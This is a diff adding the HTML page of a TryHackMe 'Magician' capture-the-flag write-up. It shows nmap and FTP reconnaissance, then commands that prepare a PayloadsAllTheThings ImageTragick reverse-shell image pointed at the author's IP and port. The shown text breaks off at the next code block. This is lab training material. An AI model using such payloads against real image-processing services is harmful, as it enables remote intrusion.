@@ -1,0 +1,331 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Magician | CyFun</title><meta name=keywords content="ctf,tryhackme,penetration-testing,writeup,linux"><meta name=description content="Magician TryHackMe writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/tryhackme/magician/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/tryhackme/magician/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Magician"><meta property="og:description" content="Magician TryHackMe writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/tryhackme/magician/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-01-01T00:00:00+00:00"><meta property="article:modified_time" content="2026-03-01T00:10:22+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/0day/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/active-directory-basics/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber-2/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/adventure-time/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/agent-sudo/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Magician"><meta name=twitter:description content="Magician TryHackMe writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"TryHackMe Writeups","item":"https://s4ch.github.io/writeups/tryhackme/"},{"@type":"ListItem","position":3,"name":"Magician","item":"https://s4ch.github.io/writeups/tryhackme/magician/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Magician","name":"Magician","description":"Magician TryHackMe writeup","keywords":["ctf","tryhackme","penetration-testing","writeup","linux"],"articleBody":"This magical website lets you convert image file formats\nMagician\n💢 We will cover the topics Network Enumeration Web Exploitation FTP Services EOP Image Manipulation Cryptography Task 1 Find the flags! Install tools used in this room on Arch Linux:\n1 $ sudo pacman -S nmap payloadsallthethings ruby-ctf-party pwncat Network enumeration Port and service scan with nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 # Nmap 7.91 scan initiated Tue Feb 23 20:19:29 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.2.188 Nmap scan report for magician (10.10.2.188) Host is up (0.033s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 8080/tcp open http-proxy | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 | Vary: Origin | Vary: Access-Control-Request-Method | Vary: Access-Control-Request-Headers | Content-Type: application/json | Date: Tue, 23 Feb 2021 19:20:28 GMT | Connection: close | {\"timestamp\":\"2021-02-23T19:20:29.162+0000\",\"status\":404,\"error\":\"Not Found\",\"message\":\"No message available\",\"path\":\"/nice%20ports%2C/Tri%6Eity.txt%2ebak\"} | HTTPOptions: | HTTP/1.1 404 | Vary: Origin | Vary: Access-Control-Request-Method | Vary: Access-Control-Request-Headers | Content-Type: application/json | Date: Tue, 23 Feb 2021 19:20:27 GMT | Connection: close | {\"timestamp\":\"2021-02-23T19:20:24.427+0000\",\"status\":404,\"error\":\"Not Found\",\"message\":\"No message available\",\"path\":\"/\"} | RTSPRequest: | HTTP/1.1 505 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 465 | Date: Tue, 23 Feb 2021 19:20:28 GMT | \u003c!doctype html\u003eHTTP Status 505 \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003eHTTP Status 505 | HTTP Version Not Supported | Socks5: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 435 | Date: Tue, 23 Feb 2021 19:20:28 GMT | Connection: close | \u003c!doctype html\u003eHTTP Status 400 \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003eHTTP Status 400 |_ Request |_http-title: Site doesn't have a title (application/json). 8081/tcp open http nginx 1.14.0 (Ubuntu) |_http-favicon: Unknown favicon MD5: CA4D0E532A1010F93901DFCB3A9FC682 | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: magician 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.91%I=7%D=2/23%Time=6035557C%P=x86_64-unknown-linux-gnu SF:%r(HTTPOptions,13B,\"HTTP/1\\.1\\x20404\\x20\\r\\nVary:\\x20Origin\\r\\nVary:\\x2 SF:0Access-Control-Request-Method\\r\\nVary:\\x20Access-Control-Request-Heade SF:rs\\r\\nContent-Type:\\x20application/json\\r\\nDate:\\x20Tue,\\x2023\\x20Feb\\x SF:202021\\x2019:20:27\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n{\\\"timestamp\\\" SF::\\\"2021-02-23T19:20:24\\.427\\+0000\\\",\\\"status\\\":404,\\\"error\\\":\\\"Not\\x20F SF:ound\\\",\\\"message\\\":\\\"No\\x20message\\x20available\\\",\\\"path\\\":\\\"/\\\"}\")%r(R SF:TSPRequest,259,\"HTTP/1\\.1\\x20505\\x20\\r\\nContent-Type:\\x20text/html;char SF:set=utf-8\\r\\nContent-Language:\\x20en\\r\\nContent-Length:\\x20465\\r\\nDate: SF:\\x20Tue,\\x2023\\x20Feb\\x202021\\x2019:20:28\\x20GMT\\r\\n\\r\\n\u003c!doctype\\x20ht SF:ml\u003eHTTP\\x20Status\\x20505\\x20\\xe2\\x80\\ \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e","wordCount":"1130","inLanguage":"en","datePublished":"2021-01-01T00:00:00Z","dateModified":"2026-03-01T00:10:22+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/tryhackme/magician/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/docs/ title=Docs><span>Docs</span></a></li><li><a href=https://s4ch.github.io/ctf/ title=CTF><span>CTF</span></a></li><li><a href=https://s4ch.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Magician</h1><div class=post-description>Magician TryHackMe writeup</div><div class=post-meta><span title='2021-01-01 00:00:00 +0000 UTC'>January 1, 2021</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1130 words&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
+,
+<a href=https://s4ch.github.io/tags/tryhackme/ class=post-tag title=tryhackme>tryhackme</a>
+,
+<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
+,
+<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
+,
+<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
+&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#-we-will-cover--the-topics>💢 We will cover the topics</a></li></ul><ul><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#ftp-discovery>FTP discovery</a></li><li><a href=#web-discovery>Web discovery</a></li><li><a href=#web-exploitation>Web exploitation</a></li><li><a href=#elevation-of-privilege-eop-from-magician-to-root>Elevation of privilege (EoP): from magician to root</a></li></ul></nav></div></details></div><div class=post-content><p>This magical website lets you convert image file formats</p><p><img loading=lazy src=/writeups/tryhackme/magician/magician.png alt=magician></p><p><a href=https://tryhackme.com/room/magician>Magician</a></p><h2 id=-we-will-cover--the-topics>💢 We will cover the topics<a hidden class=anchor aria-hidden=true href=#-we-will-cover--the-topics>#</a></h2><ul><li>Network Enumeration</li><li>Web Exploitation</li><li>FTP Services</li><li>EOP</li><li>Image Manipulation</li><li>Cryptography</li></ul><h1 id=task-1-find-the-flags>Task 1 Find the flags!<a hidden class=anchor aria-hidden=true href=#task-1-find-the-flags>#</a></h1><p>Install tools used in this room on Arch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>sudo</span> <span class=n>pacman</span> <span class=o>-</span><span class=n>S</span> <span class=n>nmap</span> <span class=n>payloadsallthethings</span> <span class=n>ruby</span><span class=o>-</span><span class=n>ctf</span><span class=o>-</span><span class=n>party</span> <span class=n>pwncat</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port and service scan with nmap:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl># Nmap 7.91 scan initiated Tue Feb 23 20:19:29 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.2.188
+</span></span><span class=line><span class=cl>Nmap scan report for magician (10.10.2.188)
+</span></span><span class=line><span class=cl>Host is up (0.033s latency).
+</span></span><span class=line><span class=cl>Not shown: 65532 closed ports
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE    VERSION
+</span></span><span class=line><span class=cl>21/tcp   open  ftp        vsftpd 2.0.8 or later
+</span></span><span class=line><span class=cl>8080/tcp open  http-proxy
+</span></span><span class=line><span class=cl>| fingerprint-strings:
+</span></span><span class=line><span class=cl>|   FourOhFourRequest:
+</span></span><span class=line><span class=cl>|     HTTP/1.1 404
+</span></span><span class=line><span class=cl>|     Vary: Origin
+</span></span><span class=line><span class=cl>|     Vary: Access-Control-Request-Method
+</span></span><span class=line><span class=cl>|     Vary: Access-Control-Request-Headers
+</span></span><span class=line><span class=cl>|     Content-Type: application/json
+</span></span><span class=line><span class=cl>|     Date: Tue, 23 Feb 2021 19:20:28 GMT
+</span></span><span class=line><span class=cl>|     Connection: close
+</span></span><span class=line><span class=cl>|     {&#34;timestamp&#34;:&#34;2021-02-23T19:20:29.162+0000&#34;,&#34;status&#34;:404,&#34;error&#34;:&#34;Not Found&#34;,&#34;message&#34;:&#34;No message available&#34;,&#34;path&#34;:&#34;/nice%20ports%2C/Tri%6Eity.txt%2ebak&#34;}
+</span></span><span class=line><span class=cl>|   HTTPOptions:
+</span></span><span class=line><span class=cl>|     HTTP/1.1 404
+</span></span><span class=line><span class=cl>|     Vary: Origin
+</span></span><span class=line><span class=cl>|     Vary: Access-Control-Request-Method
+</span></span><span class=line><span class=cl>|     Vary: Access-Control-Request-Headers
+</span></span><span class=line><span class=cl>|     Content-Type: application/json
+</span></span><span class=line><span class=cl>|     Date: Tue, 23 Feb 2021 19:20:27 GMT
+</span></span><span class=line><span class=cl>|     Connection: close
+</span></span><span class=line><span class=cl>|     {&#34;timestamp&#34;:&#34;2021-02-23T19:20:24.427+0000&#34;,&#34;status&#34;:404,&#34;error&#34;:&#34;Not Found&#34;,&#34;message&#34;:&#34;No message available&#34;,&#34;path&#34;:&#34;/&#34;}
+</span></span><span class=line><span class=cl>|   RTSPRequest:
+</span></span><span class=line><span class=cl>|     HTTP/1.1 505
+</span></span><span class=line><span class=cl>|     Content-Type: text/html;charset=utf-8
+</span></span><span class=line><span class=cl>|     Content-Language: en
+</span></span><span class=line><span class=cl>|     Content-Length: 465
+</span></span><span class=line><span class=cl>|     Date: Tue, 23 Feb 2021 19:20:28 GMT
+</span></span><span class=line><span class=cl>|     &lt;!doctype html&gt;&lt;html lang=&#34;en&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 505
+</span></span><span class=line><span class=cl>|     HTTP Version Not Supported&lt;/title&gt;&lt;style type=&#34;text/css&#34;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 505
+</span></span><span class=line><span class=cl>|     HTTP Version Not Supported&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+</span></span><span class=line><span class=cl>|   Socks5:
+</span></span><span class=line><span class=cl>|     HTTP/1.1 400
+</span></span><span class=line><span class=cl>|     Content-Type: text/html;charset=utf-8
+</span></span><span class=line><span class=cl>|     Content-Language: en
+</span></span><span class=line><span class=cl>|     Content-Length: 435
+</span></span><span class=line><span class=cl>|     Date: Tue, 23 Feb 2021 19:20:28 GMT
+</span></span><span class=line><span class=cl>|     Connection: close
+</span></span><span class=line><span class=cl>|     &lt;!doctype html&gt;&lt;html lang=&#34;en&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400
+</span></span><span class=line><span class=cl>|     Request&lt;/title&gt;&lt;style type=&#34;text/css&#34;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400
+</span></span><span class=line><span class=cl>|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+</span></span><span class=line><span class=cl>|_http-title: Site doesn&#39;t have a title (application/json).
+</span></span><span class=line><span class=cl>8081/tcp open  http       nginx 1.14.0 (Ubuntu)
+</span></span><span class=line><span class=cl>|_http-favicon: Unknown favicon MD5: CA4D0E532A1010F93901DFCB3A9FC682
+</span></span><span class=line><span class=cl>| http-methods:
+</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD
+</span></span><span class=line><span class=cl>|_http-server-header: nginx/1.14.0 (Ubuntu)
+</span></span><span class=line><span class=cl>|_http-title: magician
+</span></span><span class=line><span class=cl>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class=line><span class=cl>SF-Port8080-TCP:V=7.91%I=7%D=2/23%Time=6035557C%P=x86_64-unknown-linux-gnu
+</span></span><span class=line><span class=cl>SF:%r(HTTPOptions,13B,&#34;HTTP/1\.1\x20404\x20\r\nVary:\x20Origin\r\nVary:\x2
+</span></span><span class=line><span class=cl>SF:0Access-Control-Request-Method\r\nVary:\x20Access-Control-Request-Heade
+</span></span><span class=line><span class=cl>SF:rs\r\nContent-Type:\x20application/json\r\nDate:\x20Tue,\x2023\x20Feb\x
+</span></span><span class=line><span class=cl>SF:202021\x2019:20:27\x20GMT\r\nConnection:\x20close\r\n\r\n{\&#34;timestamp\&#34;
+</span></span><span class=line><span class=cl>SF::\&#34;2021-02-23T19:20:24\.427\+0000\&#34;,\&#34;status\&#34;:404,\&#34;error\&#34;:\&#34;Not\x20F
+</span></span><span class=line><span class=cl>SF:ound\&#34;,\&#34;message\&#34;:\&#34;No\x20message\x20available\&#34;,\&#34;path\&#34;:\&#34;/\&#34;}&#34;)%r(R
+</span></span><span class=line><span class=cl>SF:TSPRequest,259,&#34;HTTP/1\.1\x20505\x20\r\nContent-Type:\x20text/html;char
+</span></span><span class=line><span class=cl>SF:set=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20465\r\nDate:
+</span></span><span class=line><span class=cl>SF:\x20Tue,\x2023\x20Feb\x202021\x2019:20:28\x20GMT\r\n\r\n&lt;!doctype\x20ht
+</span></span><span class=line><span class=cl>SF:ml&gt;&lt;html\x20lang=\&#34;en\&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20505\x20\xe2\x80\
+</span></span><span class=line><span class=cl>SF:x93\x20HTTP\x20Version\x20Not\x20Supported&lt;/title&gt;&lt;style\x20type=\&#34;text
+</span></span><span class=line><span class=cl>SF:/css\&#34;&gt;body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20
+</span></span><span class=line><span class=cl>SF:h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-size
+</span></span><span class=line><span class=cl>SF::22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{
+</span></span><span class=line><span class=cl>SF:font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;backgr
+</span></span><span class=line><span class=cl>SF:ound-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status
+</span></span><span class=line><span class=cl>SF:\x20505\x20\xe2\x80\x93\x20HTTP\x20Version\x20Not\x20Supported&lt;/h1&gt;&lt;/bo
+</span></span><span class=line><span class=cl>SF:dy&gt;&lt;/html&gt;&#34;)%r(FourOhFourRequest,15E,&#34;HTTP/1\.1\x20404\x20\r\nVary:\x20
+</span></span><span class=line><span class=cl>SF:Origin\r\nVary:\x20Access-Control-Request-Method\r\nVary:\x20Access-Con
+</span></span><span class=line><span class=cl>SF:trol-Request-Headers\r\nContent-Type:\x20application/json\r\nDate:\x20T
+</span></span><span class=line><span class=cl>SF:ue,\x2023\x20Feb\x202021\x2019:20:28\x20GMT\r\nConnection:\x20close\r\n
+</span></span><span class=line><span class=cl>SF:\r\n{\&#34;timestamp\&#34;:\&#34;2021-02-23T19:20:29\.162\+0000\&#34;,\&#34;status\&#34;:404,\&#34;
+</span></span><span class=line><span class=cl>SF:error\&#34;:\&#34;Not\x20Found\&#34;,\&#34;message\&#34;:\&#34;No\x20message\x20available\&#34;,\&#34;p
+</span></span><span class=line><span class=cl>SF:ath\&#34;:\&#34;/nice%20ports%2C/Tri%6Eity\.txt%2ebak\&#34;}&#34;)%r(Socks5,24E,&#34;HTTP/1
+</span></span><span class=line><span class=cl>SF:\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-L
+</span></span><span class=line><span class=cl>SF:anguage:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Tue,\x2023\x20Feb\
+</span></span><span class=line><span class=cl>SF:x202021\x2019:20:28\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20
+</span></span><span class=line><span class=cl>SF:html&gt;&lt;html\x20lang=\&#34;en\&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x8
+</span></span><span class=line><span class=cl>SF:0\x93\x20Bad\x20Request&lt;/title&gt;&lt;style\x20type=\&#34;text/css\&#34;&gt;body\x20{fon
+</span></span><span class=line><span class=cl>SF:t-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:
+</span></span><span class=line><span class=cl>SF:white;background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{f
+</span></span><span class=line><span class=cl>SF:ont-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x2
+</span></span><span class=line><span class=cl>SF:0a\x20{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;
+</span></span><span class=line><span class=cl>SF:border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80
+</span></span><span class=line><span class=cl>SF:\x93\x20Bad\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&#34;);
+</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl># Nmap done at Tue Feb 23 20:20:52 2021 -- 1 IP address (1 host up) scanned in 83.04 seconds
+</span></span></code></pre></td></tr></table></div></div><p>We have:</p><ul><li>8081: a web app converting images (PNG to JPG)</li><li>8080: <code>WhiteLabel Error Page</code> which is a default generic Spring Boot error page</li><li>21: a FTP server</li></ul><p>Add an entry in our hosts file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ grep magician /etc/hosts
+</span></span><span class=line><span class=cl>10.10.2.188 magician
+</span></span></code></pre></td></tr></table></div></div><h2 id=ftp-discovery>FTP discovery<a hidden class=anchor aria-hidden=true href=#ftp-discovery>#</a></h2><p>NSE script found nothing about the FTP server (no anonymous connection) but
+trying manually on the CLI we get a quite different result:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ ftp 10.10.2.188
+</span></span><span class=line><span class=cl>Connected to 10.10.2.188.
+</span></span><span class=line><span class=cl>220 THE MAGIC DOOR
+</span></span><span class=line><span class=cl>Name (10.10.2.188:cyfun): anonymous
+</span></span><span class=line><span class=cl>331 Please specify the password.
+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl>230-Huh? The door just opens after some time? You&#39;re quite the patient one, aren&#39;t ya, it&#39;s a thing called &#39;delay_successful_login&#39; in /etc/vsftpd.conf ;) Since you&#39;re a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
+</span></span><span class=line><span class=cl>230 Login successful.
+</span></span></code></pre></td></tr></table></div></div><p>NSE script must have timeout due to <code>delay_successful_login</code>.</p><p>We have access denied on FTP, it was just to give us a hint: imagetragick.</p><p>Honestly it doesn&rsquo;t helped since the named of the box is <code>magician</code> and the
+app is about image conversion I know it was about exploiting
+an [ImageMagick][1] vulnerability.</p><h2 id=web-discovery>Web discovery<a hidden class=anchor aria-hidden=true href=#web-discovery>#</a></h2><p>Uploading PNG at http://10.10.2.188:8081/ doesn&rsquo;t work, but at http://magician:8081/
+it works as told in the box intro.</p><h2 id=web-exploitation>Web exploitation<a hidden class=anchor aria-hidden=true href=#web-exploitation>#</a></h2><p>As we already know we should exploit imagetragick, let&rsquo;s get to it directly,
+copying the payload and replacing the placeholder with our IP and port.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ cp /usr/share/payloadsallthethings/Upload\ Insecure\ Files/Picture\ Image\ Magik/imagetragik1_payload_imageover_reverse_shell_devtcp.jpg .
+</span></span><span class=line><span class=cl>$ sed -i &#39;s/ip/10.9.19.77/&#39; imagetragik1_payload_imageover_reverse_shell_devtcp.jpg
+</span></span><span class=line><span class=cl>$ sed -i &#39;s/80/9999/&#39; imagetragik1_payload_imageover_reverse_shell_devtcp.jpg
+</span></span></code></pre></td></tr></table></div></div><p>The vuln is triggered right after upload completion.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
